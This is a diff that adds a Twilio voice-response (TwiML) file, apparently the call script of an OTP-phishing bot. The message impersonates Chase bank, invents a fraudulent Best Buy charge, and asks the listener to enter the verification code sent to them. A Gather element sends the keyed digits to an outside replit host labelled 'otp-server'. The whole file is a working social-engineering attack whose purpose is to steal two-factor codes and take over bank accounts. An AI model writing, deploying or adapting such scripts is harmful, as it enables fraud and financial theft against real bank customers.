@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<Response>
+    <Gather action="https://otp-server.liteeagle262.repl.co" method="GET">
+		<Say>
+			This is a notice about your chase bank account.
+			We have noticed some fraudulent activity on your account.
+			Your account was just charged for one hundred and twenty eight dollars and 28 cents at best buy in Phoenix Arizona.
+
+			for security reasons
+			and so we can refund this charge
+			we'll need to confirm your identity.
+			please enter the verification code sent to you.
+			when you're finished
+			please press pound
+        </Say>
+    </Gather>
+    <Say>We didn't receive any input. Goodbye!</Say>
+</Response>
